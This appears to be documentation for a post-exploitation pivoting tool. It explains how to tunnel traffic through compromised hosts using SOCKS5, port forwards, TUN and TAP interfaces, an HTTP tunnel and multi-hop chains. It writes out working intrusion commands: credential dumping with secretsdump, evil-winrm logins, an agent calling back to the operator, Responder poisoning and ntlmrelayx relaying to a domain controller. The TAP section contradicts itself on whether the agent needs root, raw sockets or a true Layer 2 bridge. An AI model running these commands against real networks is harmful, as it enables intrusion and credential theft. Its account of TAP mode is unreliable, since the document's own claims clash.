# Pivoting Methods

This is the core of what Burrow does — getting your traffic from your machine to the target network through a compromised host. There are six methods, each operating at a different network layer, each with distinct capabilities and trade-offs.

## The Network Layer Model (Why It Matters)

Every pivoting method operates at a specific network layer. Understanding the layers tells you immediately what kind of traffic will and won't work through each method.

```
┌────────────────────────────────────────────────────────────────────┐
│                                                                    │
│  LAYER 4 — TCP Connections                                         │
│  ┌──────────────────────────────────────────────────────────────┐  │
│  │ SOCKS5, Port Forwards, Reverse Port Forwards, HTTP Tunnel   │  │
│  │                                                              │  │
│  │ What flows: Individual TCP connections only                  │  │
│  │ What's missing: UDP, ICMP, broadcast, multicast, raw IP     │  │
│  │ Root: No                                                    │  │
│  └──────────────────────────────────────────────────────────────┘  │
│                                                                    │
│  LAYER 3 — IP Packets                                              │
│  ┌──────────────────────────────────────────────────────────────┐  │
│  │ TUN Mode                                                    │  │
│  │                                                              │  │
│  │ What flows: TCP + UDP + ICMP + any IP protocol               │  │
│  │ What's missing: Broadcast, multicast, ARP, raw Ethernet     │  │
│  │ Root: Yes (your machine)                                     │  │
│  └──────────────────────────────────────────────────────────────┘  │
│                                                                    │
│  LAYER 2 — Ethernet Frames                                         │
│  ┌──────────────────────────────────────────────────────────────┐  │
│  │ TAP Mode                                                    │  │
│  │                                                              │  │
│  │ What flows: Everything — TCP, UDP, ICMP, ARP, broadcast,    │  │
│  │             multicast, LLMNR, NBT-NS, mDNS, 802.1Q, etc.   │  │
│  │ What's missing: Nothing (full L2 visibility)                │  │
│  │ Root: Yes (both sides)                                       │  │
│  └──────────────────────────────────────────────────────────────┘  │
│                                                                    │
└────────────────────────────────────────────────────────────────────┘

          Each layer includes everything above it.
       L3 carries all L4 traffic. L2 carries all L3 and L4 traffic.
```

The practical impact:

| Traffic Type | L4 (SOCKS5) | L3 (TUN) | L2 (TAP) |
|---|---|---|---|
| TCP connections | Yes | Yes | Yes |
| nmap SYN scan (-sS) | No (use -sT) | Yes | Yes |
| UDP services (DNS, SNMP) | No | Yes | Yes |
| Ping (ICMP) | No | Yes | Yes |
| DNS resolution | Manual config | Yes (native) | Yes (native) |
| LLMNR/NBT-NS broadcast | No | No | Yes |
| ARP | No | No | Yes |
| Responder poisoning | No | No | Yes |
| DHCP | No | No | Yes |

---

## Method 1: SOCKS5 Proxy

**Layer:** 4 (TCP only)
**Root:** No
**Setup time:** 5 seconds
**Best for:** General-purpose TCP access to internal network

### What It Is

A SOCKS5 proxy server on your machine that routes TCP connections through the agent. Your tools connect to the proxy, the proxy tells the agent "connect to X:Y", the agent makes the connection, and data flows back.

### Setup in Burrow

```
1. TUI: Select session → Enter → s
2. SOCKS5 starts on 127.0.0.1:1080
```

### How To Use It

**proxychains (wraps any tool):**
```bash
# /etc/proxychains4.conf:
# socks5 127.0.0.1 1080

proxychains nmap -sT -Pn 10.0.0.0/24
proxychains crackmapexec smb 10.0.0.0/24
proxychains evil-winrm -i 10.0.0.5 -u admin -p Password1
```

**Tools with native SOCKS5 support:**
```bash
curl --socks5 127.0.0.1:1080 http://10.0.0.5/
impacket-secretsdump -socks5 127.0.0.1:1080 domain/admin@10.0.0.5
```

**Firefox:** Settings → Network → Manual Proxy → SOCKS Host: 127.0.0.1, Port: 1080

### What Works

- Port scanning: `nmap -sT` (connect scan — NOT SYN scan)
- Web: Burp Suite, Firefox, curl
- SMB: smbclient, crackmapexec, impacket tools
- RDP: xfreerdp (with proxy settings)
- WinRM: evil-winrm via proxychains
- SSH: `ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p'`
- LDAP: ldapsearch, BloodHound collectors (via proxychains)

### What Doesn't Work

- **SYN scans** — SOCKS5 is TCP connect only, no raw packets
- **UDP anything** — DNS lookups, SNMP, TFTP. Use proxychains DNS settings or TUN mode
- **Ping** — ICMP doesn't go through TCP proxies
- **Responder/ntlmrelayx capture** — no broadcast visibility
- **Tools that bind ports** — SOCKS5 CONNECT only (no BIND or UDP ASSOCIATE)

### When To Choose SOCKS5

Always start here unless you specifically need UDP, ICMP, or broadcast. It's the lightest option, needs no root, and works with the widest range of tools via proxychains.

---

## Method 2: Port Forwarding

**Layer:** 4 (TCP only)
**Root:** No
**Setup time:** 10 seconds
**Best for:** Dedicated access to one specific service

### What It Is

A direct mapping: local port → remote target through the agent. No proxy configuration needed in your tool — just point it at localhost.

### Setup in Burrow

```
TUI: Detail view → t → Direction: local
  Listen: 127.0.0.1:3389
  Remote: 10.0.0.5:3389

Now 127.0.0.1:3389 reaches the internal RDP server.
```

### Local vs Remote

**Local forward:** Listen on YOUR machine, forward through agent to target.
```
Your Machine:3389 ──► Agent ──► Target:3389
```
Use case: You want to access an internal service.

**Remote forward:** Listen on the AGENT machine, forward back to your machine.
```
Internal Victim ──► Agent:445 ──► Your Machine:445
```
Use case: You want internal machines to connect to YOU (e.g., payload callbacks, ntlmrelayx capture).

### When To Choose Port Forwards

- Your tool doesn't support SOCKS5 at all
- You want zero-config access to one specific service (just connect to localhost)
- You need victims to connect TO you (remote forward)
- You're setting up payload callback handlers

### Port Forwards vs SOCKS5

| | Port Forward | SOCKS5 |
|---|---|---|
| Setup | Per-service | One-time |
| Tool config | None (connect to localhost) | Proxychains or native proxy |
| Multiple targets | One tunnel per target | One proxy for all targets |
| Reverse direction | Yes (remote forward) | No |
| Protocol | TCP only | TCP only |

---

## Method 3: TUN Mode (Layer 3 VPN)

**Layer:** 3 (IP — TCP, UDP, ICMP)
**Root:** Yes (your machine only)
**Setup time:** 30 seconds
**Best for:** Full network access without per-tool proxy configuration

### What It Is

A virtual network interface on your machine (`burrow0`) that captures IP packets and forwards them through the agent. The agent runs a userspace TCP/IP stack (gvisor netstack, inspired by [ligolo-ng](https://github.com/nicocha30/ligolo-ng)) that terminates the packets and dials real connections.

### How It Works (Under The Hood)

```
┌─ YOUR MACHINE ──────────────────────────────────────────────────┐
│                                                                  │
│  Tool (nmap) sends packet to 10.0.0.5                            │
│       │                                                          │
│       ▼                                                          │
│  Kernel routing table: 10.0.0.0/24 → dev burrow0                │
│       │                                                          │
│       ▼                                                          │
│  burrow0 (TUN interface, IP: 240.0.0.1/32)                      │
│       │ Raw IP packet                                            │
│       ▼                                                          │
│  Burrow reads packet, sends via yamux stream                     │
└──────┼───────────────────────────────────────────────────────────┘
       │
       │ [length][IP packet] over yamux
       │
┌──────▼─ AGENT ───────────────────────────────────────────────────┐
│                                                                  │
│  Burrow receives packet, injects into gvisor netstack            │
│       │                                                          │
│       ▼                                                          │
│  gvisor userspace TCP/IP stack processes packet:                  │
│    • TCP SYN? → Complete handshake, dial real target              │
│    • UDP?     → Create UDP socket, forward datagram              │
│    • ICMP?    → Reply or forward                                 │
│       │                                                          │
│       ▼                                                          │
│  net.Dial("tcp", "10.0.0.5:445") ← real connection              │
│       │                                                          │
│       ▼                                                          │
│  Target host on internal network                                 │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

The critical thing to understand: the agent doesn't forward IP packets directly onto the network. It terminates them in the userspace stack and creates new, real connections to the target. This means:
- Your source IP on the target network is the agent's IP, not 240.0.0.1
- There's no IP forwarding configuration needed on the agent
- The agent doesn't need to be a router

### Setup in Burrow

```bash
# 1. Start server with root (needed for TUN interface creation)
sudo burrow server --listen 0.0.0.0:11601

# 2. Agent connects (no root needed on agent for TUN)
./burrow agent --connect YOUR_IP:11601 --fp FINGERPRINT

# 3. In TUI: Ctrl+T to start TUN
# 4. Add routes: r → 10.0.0.0/24
# 5. Use tools natively — no proxychains needed
nmap -sS -Pn 10.0.0.5        # SYN scan works!
ping 10.0.0.5                 # ICMP works!
dig @10.0.0.1 domain.local    # DNS (UDP) works!
smbclient //10.0.0.5/share    # no proxychains needed
```

### What Works That SOCKS5 Can't Do

- **SYN scans** (`nmap -sS`) — raw IP packets flow through TUN
- **UDP services** — DNS resolution, SNMP polling, TFTP, NTP
- **ICMP** — ping sweeps, traceroute
- **Any tool natively** — no proxychains, no proxy configuration
- **Multiple protocols simultaneously** — TCP + UDP + ICMP all at once

### What Still Doesn't Work

- **Broadcast/multicast** — LLMNR, NBT-NS, mDNS, ARP
- **Responder poisoning** — requires Layer 2
- **Being on the same subnet** — you're routed, not bridged

### The Magic IP Range

TUN uses the `240.0.0.0/4` reserved IP range. This range is never used on real networks, so there's no routing conflict. The TUN interface gets `240.0.0.1/32` and routes are added to direct target traffic through it.

### TUN vs SOCKS5

| | SOCKS5 | TUN |
|---|---|---|
| TCP | Yes | Yes |
| UDP | No | Yes |
| ICMP | No | Yes |
| SYN scan | No | Yes |
| Root needed | No | Yes (your machine) |
| Tool config | Proxychains or native | None — native routing |
| Overhead | Low | Medium |
| Bandwidth | High | High |

**When To Choose TUN:** When you need UDP (DNS, SNMP), ICMP (ping), or SYN scans. When you're tired of proxychains. When you want tools to work exactly as if your machine is on the network.

---

## Method 4: TAP Mode (Layer 2 Bridge)

**Layer:** 2 (Ethernet — everything)
**Root:** Yes on your machine (TAP interface creation), No on the agent
**Setup time:** 30 seconds (Ctrl+A, confirm IP, done)
**Best for:** Broadcast-dependent attacks (Responder, ntlmrelayx, mitm6), getting an IP on the target subnet

### What It Is

A virtual Ethernet interface on your machine (`burrow-tap0`) that gives you an IP address on the target network's subnet. The agent uses the same gvisor netstack as TUN mode — no raw sockets, no root on the agent. Ethernet frames from your TAP are stripped to IP and processed by the netstack; responses get an Ethernet header prepended and are delivered back to your TAP.

When you press `Ctrl+A`, Burrow prompts you for the IP address and route. It pre-fills both from the agent's subnet (e.g., `10.10.10.200/24` and `10.10.10.0/24`). You verify the IP is unused, hit Enter, and the TAP interface is created, configured, and routed — all in one step.

### How It Works (Under The Hood)

```
┌─ YOUR MACHINE ──────────────────────────────────────────────────┐
│                                                                  │
│  Responder / ntlmrelayx listen on burrow-tap0                    │
│       │                                                          │
│       ▼                                                          │
│  burrow-tap0 (TAP interface)                                     │
│  IP: 10.10.10.200/24 (assigned by Burrow from Ctrl+A prompt)    │
│       │ Ethernet frames                                          │
│       ▼                                                          │
│  Burrow reads frames, strips L2 header, sends IP via yamux       │
└──────┼───────────────────────────────────────────────────────────┘
       │
       │ [length][Ethernet frame] over yamux
       │
┌──────▼─ AGENT (no root needed) ─────────────────────────────────┐
│                                                                  │
│  gvisor netstack (same as TUN mode)                              │
│       │                                                          │
│       ▼                                                          │
│  Strips Ethernet header → injects IP packet into netstack        │
│  Netstack dials real targets (TCP/UDP/ICMP)                      │
│  Responses get Ethernet header prepended → sent back to operator │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### Why TAP Is Different From Everything Else

The fundamental difference is what gets forwarded:

```
SOCKS5:  "Connect me to 10.0.0.5 port 445"
         → Agent makes a new TCP connection to 10.0.0.5:445
         → Only YOUR traffic, only TCP, only what you explicitly request

TUN:     [IP packet: src=240.0.0.1, dst=10.0.0.5, TCP SYN port 445]
         → Agent processes packet in userspace stack
         → Agent makes a new TCP connection to 10.0.0.5:445
         → YOUR traffic (TCP+UDP+ICMP), routed through agent, no broadcast

TAP:     [Ethernet frame: dst=FF:FF:FF:FF:FF:FF, ARP who-has 10.0.0.1?]
         → Frame injected onto target network wire as-is
         → EVERYONE'S traffic, all protocols, all broadcast/multicast
         → You're on the wire
```

### Setup in Burrow

```bash
# 1. Server with root
sudo burrow server --listen 0.0.0.0:11601

# 2. Agent with root (needs AF_PACKET for raw socket)
sudo ./burrow agent --connect YOUR_IP:11601 --fp FINGERPRINT

# 3. TUI: Ctrl+A to start TAP
#    Agent auto-detects default NIC

# 4. Assign an IP on the target subnet
ip addr add 10.0.0.200/24 dev burrow-tap0
```

### Responder + ntlmrelayx Through TAP

This is the primary use case for TAP mode. Here's exactly how it works:

```
Step 1: Victim's machine sends LLMNR query
        "Who is FILESERVERR?" (broadcast to 224.0.0.252)
              │
Step 2: Agent's raw socket captures broadcast frame
              │
Step 3: Frame forwarded through tunnel to your TAP
              │
Step 4: Responder on burrow-tap0 sees the query
        Responds: "That's me! I'm at 10.0.0.200"
              │
Step 5: Response sent through TAP → tunnel → agent raw socket → wire
              │
Step 6: Victim connects to 10.0.0.200:445 (your TAP IP)
        Sends NTLM authentication
              │
Step 7: NTLM auth arrives on your TAP interface
        ntlmrelayx captures it and relays to LDAP on the DC
```

**Terminal setup:**
```bash
# Terminal 1: Start Responder
sudo responder -I burrow-tap0 -w -d -P

# Terminal 2: Start ntlmrelayx
sudo ntlmrelayx.py -t ldap://10.0.0.1 -l loot -smb2support

# Terminal 3: Monitor
watch -n1 'cat loot/*.html 2>/dev/null | head -50'
```

### Requirements and Limitations

**Requirements:**
- Root/sudo on your machine (to create the TAP interface)
- Agent does NOT need root — uses the same userspace netstack as TUN mode

**Limitations:**
- TAP uses netstack (like TUN), so the agent terminates and re-creates connections — it's not a raw L2 bridge. Your tools see Ethernet frames, but the agent processes them as IP.
- The agent needs to be on the same network as the targets you want to reach.

### TAP vs TUN vs SOCKS5

```
Feature              SOCKS5      TUN         TAP
─────────────────────────────────────────────────────
TCP                  ✓           ✓           ✓
UDP                  ✗           ✓           ✓
ICMP                 ✗           ✓           ✓
Own IP on subnet     ✗           ✗           ✓
Responder/relay      ✗           ✗           ✓
Root (your box)      No          Yes         Yes
Root (agent)         No          No          No
Bandwidth overhead   Low         Medium      Medium
Setup complexity     Simple      Ctrl+T      Ctrl+A
```

---

## Method 5: HTTP Tunnel

**Layer:** 7 (HTTP) wrapping Layer 4 (TCP)
**Root:** No
**Best for:** When the agent has no outbound connectivity, but you can reach its HTTP port

### What It Is

A web-based tunnel inspired by [reGeorg](https://github.com/sensepost/reGeorg) and [Neo-reGeorg](https://github.com/L-codes/Neo-reGeorg). The HTTP tunnel server runs on the target and provides a SOCKS5 interface on your machine. Traffic is encapsulated in HTTP POST requests.

This solves a fundamentally different problem than the other methods: what if the agent can't connect OUT to you, but you can connect IN to it?

### When You Need It

```
Normal Burrow:     Agent ──► outbound TCP ──► Your Server
                   (agent initiates connection)

HTTP Tunnel:       Your Client ──► inbound HTTP ──► Target Server
                   (YOU initiate connection to the target)
```

Use cases:
- Target is a web server in a DMZ — no outbound Internet access
- You have code execution on the target but all outbound connections are blocked
- The only port open on the target is 80 or 443
- The target is behind a WAF that only passes HTTP

### Setup

```bash
# On the target (HTTP tunnel server)
./burrow tunnel server --listen 0.0.0.0:8080 --key s3cret --path /api/status

# On your machine (HTTP tunnel client)
./burrow tunnel client \
  --connect http://target:8080/api/status \
  --listen 127.0.0.1:1080 \
  --key s3cret

# Now use SOCKS5 at 127.0.0.1:1080
proxychains nmap -sT 10.0.0.0/24
```

### Limitations

- **TCP only** — inherits SOCKS5 limitations (no UDP, no ICMP)
- **Higher latency** — every data exchange is an HTTP request/response
- **Detection** — persistent HTTP POST traffic to a single endpoint is suspicious
- **Server process** — requires running a server on the target (more visible than an agent)
- **Single direction** — your client connects to the target server (not the other way around)

---

## Method 6: Pivot Chains (Multi-Hop)

**Layer:** 4 (TCP via nested SOCKS5)
**Root:** No
**Best for:** Reaching segmented networks through multiple compromised hosts

### What It Is

Chaining SOCKS5 proxies to reach a target that isn't directly accessible from the first compromised host.

```
Your Machine ──► Agent 1 (DMZ) ──► Agent 2 (Corp) ──► Target (DC)
     └─ SOCKS5 ────┘  └─ SOCKS5 ────┘  └─ TCP ────┘
```

Each hop uses SOCKS5 CONNECT to establish a tunnel through the next hop. The result is a single TCP stream that traverses all hops.

### When You Need It

Network segmentation. Your first agent is in the DMZ, but the domain controller is in a management VLAN only reachable from specific jump hosts. You need to chain through multiple agents to reach it.

### Limitations

- **Additive latency** — each hop adds round-trip time
- **Weakest link bandwidth** — the slowest hop limits total throughput
- **Fragility** — any hop going down kills the entire chain
- **TCP only** — no UDP, ICMP, or broadcast at any hop

---

## Decision Flowchart

```
START: What do you need to do?
│
├─► "I need Responder / LLMNR poisoning / L2 attacks"
│       │
│       ├── Have root on agent? ──► YES ──► TAP MODE
│       │                                   ip addr add TARGET_SUBNET_IP/MASK dev burrow-tap0
│       │                                   responder -I burrow-tap0
│       │
│       └── No root on agent? ──► WORKAROUNDS:
│               • Run Inveigh directly on agent (exec command)
│               • Reverse port forward 445 to your ntlmrelayx
│               • Upload Responder to agent and run locally
│
├─► "I need UDP (DNS/SNMP) or ICMP (ping) or SYN scans"
│       │
│       ├── Have root on your machine? ──► YES ──► TUN MODE
│       │                                          Add routes for target networks
│       │                                          Use tools natively
│       │
│       └── No root? ──► WORKAROUNDS:
│               • SOCKS5 + configure DNS manually
│               • Port forward for specific UDP services
│               • Use -sT instead of -sS for nmap
│
├─► "I need TCP access to many internal hosts"
│       │
│       └──► SOCKS5 PROXY
│            proxychains for tools that don't support SOCKS5
│            Native proxy config for tools that do
│
├─► "I need one specific service"
│       │
│       └──► PORT FORWARD
│            No proxy config needed — connect to localhost
│
├─► "Victims need to connect to me"
│       │
│       └──► REVERSE PORT FORWARD
│            Agent listens, forwards to your local port
│            Common for: ntlmrelayx, payload handlers
│
├─► "Agent can't connect outbound"
│       │
│       └──► HTTP TUNNEL
│            Run server on target, client on your machine
│            You initiate connection to target
│
└─► "Multiple network segments to traverse"
        │
        └──► PIVOT CHAINS
             Chain through multiple agents
             Each hop adds latency
```

---

## Combining Methods

Methods aren't mutually exclusive. In a real engagement, you'll often use several simultaneously:

```
┌─ Session 1 (Web Server in DMZ) ────────────────────────────────┐
│                                                                  │
│  SOCKS5 (port 1080) ← for general web app testing               │
│  Port Forward (8443 → internal-app:443) ← for Burp Suite        │
│  Reverse Forward (agent:4444 → your:4444) ← for shell callback  │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘

┌─ Session 2 (Workstation in Corp VLAN) ─────────────────────────┐
│                                                                  │
│  TUN mode ← for nmap scanning the Corp VLAN                     │
│  TAP mode ← for Responder on the Corp VLAN (if both are active) │
│  SOCKS5 (port 1081) ← for impacket tools                        │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

TUN and TAP can run simultaneously on the same session. SOCKS5 can run alongside both. Port forwards are independent of everything else. Use whatever combination the situation demands.
